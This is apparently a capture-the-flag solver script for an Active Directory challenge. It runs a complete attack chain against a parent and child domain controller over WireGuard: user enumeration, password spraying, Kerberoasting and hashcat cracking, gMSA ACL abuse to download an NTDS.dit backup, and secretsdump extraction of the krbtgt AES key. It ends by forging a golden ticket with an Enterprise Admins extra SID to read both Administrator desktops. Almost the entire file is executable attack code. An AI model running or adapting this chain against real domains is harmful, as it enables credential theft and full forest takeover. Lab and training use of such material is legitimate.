#!/usr/bin/env bash
set -Eeuo pipefail
umask 077

AD13_PACKAGE_DIR="$(cd -- "$(dirname -- "$0")/.." && pwd)"
AD13_HELPERS="$AD13_PACKAGE_DIR/program/helpers"
AD13_PYTHON_ROOT=/tmp/ad13-python-packages
AD13_RUN_DIR="$(mktemp -d /tmp/ad13-ma-run.XXXXXX)"
AD13_LOG_FILE="$AD13_RUN_DIR/terminal.log"
export PYTHONPATH="$AD13_PYTHON_ROOT"
export KRB5_CONFIG="$AD13_PACKAGE_DIR/program/krb5.conf"

fail() {
  printf 'ERROR: %s\n' "$*" >&2
  exit 1
}

for AD13_TOOL in python3 hashcat ip getent; do
  command -v "$AD13_TOOL" >/dev/null || fail "Missing command: $AD13_TOOL"
done
for AD13_SCRIPT in getTGT.py secretsdump.py ticketer.py; do
  [[ -f "$AD13_PYTHON_ROOT/bin/$AD13_SCRIPT" ]] || fail "Missing helper: $AD13_PYTHON_ROOT/bin/$AD13_SCRIPT"
done
python3 -c 'import impacket, ldap3, Crypto, gssapi' >/dev/null 2>&1 || fail "Activate the ctf environment with Impacket, ldap3, gssapi, and pycryptodome"
ip route get 10.244.0.10 >/dev/null 2>&1 || fail "WireGuard is not routing to the parent DC"
ip route get 10.244.0.20 >/dev/null 2>&1 || fail "WireGuard is not routing to the child DC"
getent hosts dc-new.velocity.hacklu >/dev/null || fail "Map 10.244.0.10 to dc-new.velocity.hacklu in /etc/hosts"
getent hosts dc-old.old.velocity.hacklu >/dev/null || fail "Map 10.244.0.20 to dc-old.old.velocity.hacklu in /etc/hosts"

mkdir -p "$AD13_RUN_DIR/backup_dump/Export"
exec > >(tee -a "$AD13_LOG_FILE") 2>&1
trap 'printf "\nTerminal log and private run files: %s\n" "$AD13_RUN_DIR"' EXIT

run() {
  printf '\n$'
  printf ' %q' "$@"
  printf '\n'
  "$@"
}

printf 'AD-13 M&A · live run against the supplied parent and child DCs\n'
printf 'Private output directory: %s\n' "$AD13_RUN_DIR"

python3 - "$AD13_HELPERS" "$AD13_RUN_DIR" <<'PY'
from pathlib import Path
import sys

helpers, run_dir = map(Path, sys.argv[1:])
replacements = {
    "/tmp/ad13-ma.VDTOko": str(run_dir),
    "/mnt/c/Users/m/Downloads/.ctf-workbench/ad13-ma/challenges/AD-13/backup_dump/Export":
        str(run_dir / "backup_dump" / "Export"),
    "/mnt/c/Users/m/Downloads/.ctf-workbench/ad13-ma/challenges/AD-13/kerberoast.hash":
        str(run_dir / "kerberoast.hash"),
}
for source in helpers.glob("*.py"):
    text = source.read_text(encoding="utf-8")
    for old, new in replacements.items():
        text = text.replace(old, new)
    (run_dir / source.name).write_text(text, encoding="utf-8")
PY

cd "$AD13_RUN_DIR"

printf '\n1. Enumerate the child domain and find the test login\n'
run env AD13_CHILD_DOMAIN_SID_FILE="$AD13_RUN_DIR/child_domain_sid.txt" \
  python3 "$AD13_RUN_DIR/samr_enum.py"
run python3 "$AD13_RUN_DIR/spray_service.py"

printf '\n2. Request and crack the legacy service ticket\n'
printf '$ python3 roast_spn.py  [ticket bytes saved privately]\n'
python3 "$AD13_RUN_DIR/roast_spn.py" > "$AD13_RUN_DIR/roast_spn.raw"
awk '/service_principal=/{print;next}/enctype=/{print}' "$AD13_RUN_DIR/roast_spn.raw"
[[ -s "$AD13_RUN_DIR/kerberoast.hash" ]] || fail "No service ticket hash was produced"
printf '$ hashcat -m 13100 -a 3 kerberoast.hash Granite?d?d\n'
hashcat -m 13100 -a 3 "$AD13_RUN_DIR/kerberoast.hash" 'Granite?d?d' \
  --potfile-path "$AD13_RUN_DIR/hashcat.potfile" --quiet \
  > "$AD13_RUN_DIR/hashcat.raw" 2>&1 || true
AD13_SYNC_PASSWORD="$(
  hashcat -m 13100 --show --potfile-path "$AD13_RUN_DIR/hashcat.potfile" \
    "$AD13_RUN_DIR/kerberoast.hash" 2>/dev/null |
    awk -F: 'NF > 1 { print $NF; exit }' || true
)"
if [[ -z "$AD13_SYNC_PASSWORD" ]]; then
  read -r -s -p "Hashcat did not recover it. Enter the recovered svc_granite_sync password: " AD13_SYNC_PASSWORD
  printf '\n'
fi
[[ -n "$AD13_SYNC_PASSWORD" ]] || fail "A service-account password is required"
printf 'svc_granite_sync password recovered.\n'

printf '\n3. Follow the trust and inspect the parent gMSA ACL\n'
run python3 "$AD13_PYTHON_ROOT/bin/getTGT.py" \
  -dc-ip 10.244.0.20 OLD.VELOCITY.HACKLU/svc_test:svc_test
run python3 "$AD13_RUN_DIR/cross_tgt.py"
run env KRB5CCNAME="$AD13_RUN_DIR/svc_test.ccache" \
  AD13_PARENT_EA_SID_FILE="$AD13_RUN_DIR/parent_ea_sid.txt" \
  python3 "$AD13_RUN_DIR/parent_gmsa_acl.py"
[[ -s "$AD13_RUN_DIR/child_domain_sid.txt" ]] || fail "The child domain SID was not saved"
[[ -s "$AD13_RUN_DIR/parent_ea_sid.txt" ]] || fail "The parent Enterprise Admins SID was not saved"
run python3 "$AD13_PYTHON_ROOT/bin/getTGT.py" \
  -dc-ip 10.244.0.20 "OLD.VELOCITY.HACKLU/svc_granite_sync:$AD13_SYNC_PASSWORD"
run env KRB5CCNAME="$AD13_RUN_DIR/svc_granite_sync.ccache" \
  python3 "$AD13_RUN_DIR/parent_gmsa_read.py"

printf '\n4. Download the old domain backup and recover its krbtgt key\n'
run python3 "$AD13_RUN_DIR/gmsa_download_ntds.py"
printf '$ secretsdump.py -system backup_dump/Export/SYSTEM -ntds backup_dump/Export/NTDS.dit LOCAL  [secret output saved privately]\n'
if ! python3 "$AD13_PYTHON_ROOT/bin/secretsdump.py" \
  -system "$AD13_RUN_DIR/backup_dump/Export/SYSTEM" \
  -ntds "$AD13_RUN_DIR/backup_dump/Export/NTDS.dit" LOCAL \
  -outputfile "$AD13_RUN_DIR/old_ntds_hashes" \
  > "$AD13_RUN_DIR/secretsdump.raw" 2>&1; then
  tail -n 12 "$AD13_RUN_DIR/secretsdump.raw"
  fail "Offline extraction failed; see the private run directory"
fi
awk -F: '$1=="krbtgt" && $2=="aes256-cts-hmac-sha1-96" {
  print "Old-domain krbtgt AES256 key recovered (value kept private)"; found=1
} END { if (!found) exit 1 }' "$AD13_RUN_DIR/old_ntds_hashes.ntds.kerberos" \
  || fail "The expected krbtgt AES256 key was not found"

printf '\n5. Create the ticket and read both Administrator desktops\n'
printf '$ ticketer.py -aesKey [local key] -domain OLD.VELOCITY.HACKLU -groups 512,513 -extra-sid [parent Enterprise Admins] Administrator\n'
python3 "$AD13_PYTHON_ROOT/bin/ticketer.py" \
  -aesKey "$(awk -F: '$1=="krbtgt" && $2=="aes256-cts-hmac-sha1-96" {print $3; exit}' "$AD13_RUN_DIR/old_ntds_hashes.ntds.kerberos")" \
  -domain-sid "$(cat "$AD13_RUN_DIR/child_domain_sid.txt")" \
  -domain OLD.VELOCITY.HACKLU -groups 512,513 \
  -extra-sid "$(cat "$AD13_RUN_DIR/parent_ea_sid.txt")" Administrator
run env KRB5CCNAME="$AD13_RUN_DIR/Administrator.ccache" \
  python3 "$AD13_RUN_DIR/golden_desktops.py"
python3 - "$AD13_RUN_DIR" <<'PY'
from pathlib import Path
import sys

run_dir = Path(sys.argv[1])
child = (run_dir / "flag_child.bin").read_bytes().decode("utf-16").strip()
parent = (run_dir / "flag_parent.bin").read_bytes().decode("utf-16").strip()
print("Joined flag:", child + parent)
PY

if [[ -t 0 ]]; then
  read -r -p "Take your screenshot now, then press Enter. " AD13_CAPTURE_ACK
fi
